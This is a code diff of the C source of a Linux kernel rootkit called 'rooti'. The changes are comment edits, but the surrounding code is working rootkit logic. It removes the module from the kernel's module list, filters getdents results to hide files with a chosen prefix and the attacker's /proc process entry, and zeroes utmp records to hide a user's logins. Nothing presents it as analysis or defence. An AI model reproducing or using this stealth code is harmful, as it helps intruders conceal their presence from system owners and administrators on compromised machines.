@@ -6,16 +6,14 @@
 #include "../config.h"
 
 /* 
- * Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
- * When hidden, the variable prev_module stores the address of the node that was previously
- * before this module in the list, otherwise it is NULL.
+    Indicates whether the rootkit is missing from the list of kernel modules (e.g is hidden).
+    When hidden, the variable prev_module stores the address of the node that was previously
+    before this module in the list, otherwise it is NULL.
 */
 bool rooti_hidden = false;
 static struct list_head *prev_module = NULL;
 
-/*
-    Hides this rootkit by removing it from the kernel modules list.
-*/
+// Hides this rootkit by removing it from the kernel modules list.
 void rooti_hideme()
 {
     rooti_hidden = true;
@@ -23,9 +21,7 @@ void rooti_hideme()
     list_del(&THIS_MODULE->list);
 }
 
-/*
-    Reveals this rootkit by re-adding it to the kernel modules list.
-*/
+// Reveals this rootkit by re-adding it to the kernel modules list.
 void rooti_showme()
 {
     rooti_hidden = false;
@@ -33,6 +29,7 @@ void rooti_showme()
     prev_module = NULL;
 }
 
+// Determines whether the file entry qualifies to be hidden
 static bool rooti_should_hide_file(struct linux_dirent64 *record)
 {
     // Check if the entry's name begins with the prefix of hidden files
@@ -43,6 +40,7 @@ static bool rooti_should_hide_file(struct linux_dirent64 *record)
     return false;
 }
 
+// Determines whether the process (file in /proc) qualifies to be hidden
 static bool rooti_should_hide_proc(struct linux_dirent64 *record, pid_t client_pid)
 {
     // Convert client PID to string, essentially the filename in /proc
@@ -53,6 +51,12 @@ static bool rooti_should_hide_proc(struct linux_dirent64 *record, pid_t client_p
     return strncmp(record->d_name, client_name, NAME_MAX) == 0;
 }
 
+/*
+    Conceals the dir entry from the results - either by increasing the size of the previous record
+    to skip-over the hidden record, or if the record happens to be the first one in the buffer, shifts the
+    entire buffer to override the entry, decreasing the size of the buffer accordingly.
+    The updated size of the buffer is returned.
+*/
 static size_t rooti_filter_dir_entry(struct linux_dirent64 *curr_record, struct linux_dirent64 *prev_record, size_t count)
 {
     // Special case where the record to hide is the first one
@@ -67,6 +71,10 @@ static size_t rooti_filter_dir_entry(struct linux_dirent64 *curr_record, struct 
     return count;
 }
 
+/*
+    Filters out all entries that should be hidden from the results buffer.
+    The updated size of the buffer is returned.
+*/
 static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_t count, bool is_proc_dir, pid_t client_pid)
 {
     struct linux_dirent64 *curr_record = NULL;
@@ -89,6 +97,10 @@ static size_t rooti_filter_dir_entries(struct linux_dirent64 *records_buf, size_
     return count;
 }
 
+/*
+    Rigs the results of getdents by copying the results buffer into kernel space, filtering out any
+    entries that should be hidden and copying the rigged results back to user space.
+*/
 size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, bool is_proc_dir, pid_t client_pid)
 {
     // Allocate a kernel buffer to store the data returned to user
@@ -119,13 +131,21 @@ size_t rooti_hide_dir_entries(struct linux_dirent64 *user_buf, size_t count, boo
     return count;
 }
 
+/*
+    Rigs the record returned from the utmp file, hiding the record if the user should be hidden.
+    This is achieved by copying the results into kernel space, filling the buffer with zeros and
+    returning the rigged results back into user space.
+*/
 int rooti_hide_login_entry(char *user_buf, size_t count, char *name)
 {
+    // Allocate a kernel buffer to store the data returned to user
     char *kernel_buf = kmalloc(count, GFP_KERNEL);
     if (kernel_buf == NULL) {
         printk(KERN_DEBUG "rooti: failed to allocate memory\n");
         return -ENOMEM;
     }
+
+    // Copy the results into our kernel buffer
     int err = copy_from_user(kernel_buf, user_buf, count);
     if (err > 0) {
         printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
@@ -133,10 +153,12 @@ int rooti_hide_login_entry(char *user_buf, size_t count, char *name)
         return -EFAULT;
     }
 
+    // Check if the username contained the in the record is of a user that should be hidden
     struct utmp *utmp_buf = (struct utmp *)kernel_buf;
     if (strncmp(utmp_buf->ut_user, name, UT_NAMESIZE) == 0) {
         // Match found, fill the buffer with zeros, marking it as invalid
         memset(kernel_buf, 0, count);
+        // Copy the results back to user space
         err = copy_to_user(user_buf, kernel_buf, count);
         if (err > 0) {
             printk(KERN_DEBUG "rooti: copy_to_user() failed\n");
